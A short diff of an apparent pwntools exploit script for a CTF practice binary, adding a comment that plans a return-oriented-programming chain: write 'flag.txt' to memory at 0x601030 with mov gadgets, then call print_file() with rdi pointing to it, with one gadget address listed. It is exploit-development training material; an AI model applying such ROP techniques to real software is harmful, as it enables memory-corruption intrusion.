@@ -5,7 +5,20 @@ from pwn import *
 import sys
 
 """
-Interesting gadgets:
+-------------------------------------------
+Plan :
+-------------------------------------------
+
+Using gadgets in the style
+mov PTR[reg] reg
+
+We write "flag.txt" somewhere in memory (here 0x601030).
+
+Then, we can call print_file() with $rdi pointing to "flag.txt" 
+
+-------------------------------------------
+Our gadgets :
+-------------------------------------------
 
 0x40062a: pop rdx;
 		  pop rcx; add rcx, 0x3ef2;
